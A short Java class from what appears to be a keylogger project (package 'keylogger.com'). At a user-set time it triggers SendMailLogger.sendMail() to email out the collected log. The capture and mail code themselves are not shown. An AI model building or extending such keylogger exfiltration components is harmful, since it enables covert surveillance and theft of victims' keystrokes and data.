package keylogger.com;

import java.time.ZoneId;
import java.time.ZonedDateTime;

public class SendDate {

    public static void sendTime(int houruser, int minuser) {
        ZoneId zoneId = ZoneId.of("America/Sao_Paulo");
        ZonedDateTime zonedDateTime = ZonedDateTime.now(zoneId);
        int hour = zonedDateTime.getHour();
        int minute = zonedDateTime.getMinute();

        if (hour == houruser && minute == minuser) {
            System.out.println("⏰ Hora configurada atingida! Enviando log...");
            SendMailLogger.sendMail();
        }
        
    }
}
